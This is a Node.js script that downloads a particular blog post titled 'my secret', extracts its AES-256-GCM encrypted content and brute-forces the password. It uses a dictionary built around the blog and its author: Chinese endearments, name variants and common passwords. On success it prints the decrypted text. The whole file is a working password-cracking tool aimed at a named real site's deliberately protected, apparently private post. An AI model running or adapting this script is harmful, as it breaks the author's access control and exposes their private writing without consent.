import { pbkdf2Sync, createDecipheriv } from 'node:crypto';
import https from 'node:https';
import fs from 'node:fs';

const TARGET_URL = process.env.TARGET_URL || 'https://blyciallo.com/posts/wo-de-mi-mi/';
const SLUG = process.env.SLUG || 'wo-de-mi-mi';
const WORDLIST_URL = process.env.CUSTOM_WORDLIST || '';
const ITERATIONS = 100000;
const SALT_LEN = 16;
const IV_LEN = 12;
const TAG_LEN = 16;

const DICTIONARY = [
  '我爱你', '宝贝', '亲爱的', '爱你', '爱', '520', '1314',
  'woaibiaozhidao', 'wodeaima', 'love', 'loveyou', 'iloveyou',
  '我爱你啊', '亲爱的我', '宝贝我爱你', '爱你一生', '永远爱你',
  'wode', 'miaomia', 'mimi', '秘密', 'password', '123456',
  'blyciallo', 'bailisi', 'woaima', 'wodeaima888', '5201314',
  '1314520', 'xihuan', 'woxihuan', 'wuxian', '永远',
  'baby', 'darling', 'sweetheart', 'honey', 'mylove',
  'woaima1314', 'wode520', 'aiwo', 'wodia', 'wodeai',
  '666', '888', '123456789', 'qwer1234', 'asdfghjk',
  'firefly', 'firefly2026', 'bly', 'bly~', 'blyciallololi',
  '表达爱的方式', '表达', '方式', '爱的方式',
  'woaima666', 'loveme', 'iwantyou', 'missyou', '想你',
  'wodeaima2026', 'aima', 'aima2026', 'bilibili',
  'bly2026', 'qwc', 'qwcch', '1q2w3e4r', 'zxcvbn',
];

function fetchText(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

async function loadDictionary() {
  if (WORDLIST_URL) {
    console.log(`[*] Downloading wordlist from ${WORDLIST_URL}...`);
    const text = await fetchText(WORDLIST_URL);
    return text.split(/\s+/).filter(w => w.length > 0);
  }
  if (fs.existsSync('wordlist.txt')) {
    const text = fs.readFileSync('wordlist.txt', 'utf8');
    return text.split(/\s+/).filter(w => w.length > 0);
  }
  return DICTIONARY;
}

function fetchHtml(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

function extractEncrypted(html) {
  const match = html.match(/data-encrypted="([^"]+)"/);
  if (!match) throw new Error('Could not find data-encrypted attribute');
  return match[1];
}

function tryDecrypt(encryptedB64, password) {
  const raw = Buffer.from(encryptedB64, 'base64');
  const salt = raw.slice(0, SALT_LEN);
  const iv = raw.slice(SALT_LEN, SALT_LEN + IV_LEN);
  const authTag = raw.slice(SALT_LEN + IV_LEN, SALT_LEN + IV_LEN + TAG_LEN);
  const ciphertext = raw.slice(SALT_LEN + IV_LEN + TAG_LEN);

  const key = pbkdf2Sync(password, salt, ITERATIONS, 32, 'sha256');
  const decipher = createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(authTag);
  try {
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return decrypted.toString();
  } catch {
    return null;
  }
}

async function main() {
  const dictionary = await loadDictionary();
  console.log(`[*] Fetching ${TARGET_URL}...`);
  const html = await fetchHtml(TARGET_URL);

  let encryptedData;
  try {
    encryptedData = extractEncrypted(html);
  } catch {
    const match2 = html.match(/data-encrypted='([^']+)'/);
    if (match2) {
      encryptedData = match2[1];
    } else {
      throw new Error('Could not find encrypted data in page');
    }
  }
  console.log(`[+] Found encrypted data (${encryptedData.length} chars)`);
  console.log(`[*] Slug: ${SLUG}`);
  console.log(`[*] Dictionary size: ${dictionary.length}`);
  console.log(`[*] Starting brute force...`);

  const start = Date.now();
  let checked = 0;

  for (const pwd of dictionary) {
    checked++;
    const result = tryDecrypt(encryptedData, pwd);
    if (result && result.length > 0) {
      const elapsed = ((Date.now() - start) / 1000).toFixed(2);
      console.log(`\n[SUCCESS] Password found: ${pwd}`);
      console.log(`[CHECKED] ${checked} passwords in ${elapsed}s`);
      console.log(`[DECRYPTED PREVIEW]:`);
      console.log(result.slice(0, 1000));
      process.exit(0);
    }
    if (checked % 100 === 0) {
      console.log(`[*] Checked ${checked}/${dictionary.length}...`);
    }
  }

  console.log('\n[FAIL] Password not found in dictionary.');
  process.exit(1);
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
